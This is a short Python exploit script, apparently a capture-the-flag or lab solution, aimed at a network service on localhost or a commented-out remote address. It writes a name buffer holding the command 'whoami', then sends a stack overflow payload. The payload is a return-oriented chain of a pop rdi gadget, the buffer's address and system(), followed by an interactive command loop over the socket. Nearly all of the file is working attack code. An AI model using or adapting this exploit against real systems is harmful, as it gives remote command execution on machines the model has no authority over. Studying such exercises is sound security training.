import socket
import readline

host = '127.0.0.1'
port = 9000
# host = '120.114.62.211'
# port =  2120

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res.decode('ascii'))
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

# TODO

padding   = b'A'*56
obj_name  = 0x601070
system    = 0x400530
pop_rdi   = 0x400773
ret       = 0x400706  # Stack alignment for MOVAPS
main_read = 0x4006e7

cmd = b'whoami'
cmd += b';'*(0x10-len(cmd))

payload  = b''
payload += padding
payload += pop_rdi.to_bytes(8, 'little')
payload += obj_name.to_bytes(8, 'little')
# payload += ret.to_bytes(8, 'little')
payload += system.to_bytes(8, 'little')


with open('payload', 'wb') as f:
	f.write(cmd)
	f.write(payload)

recv('Name')
send(cmd)
recv('Payload')
send(payload)
# recv()
interact()
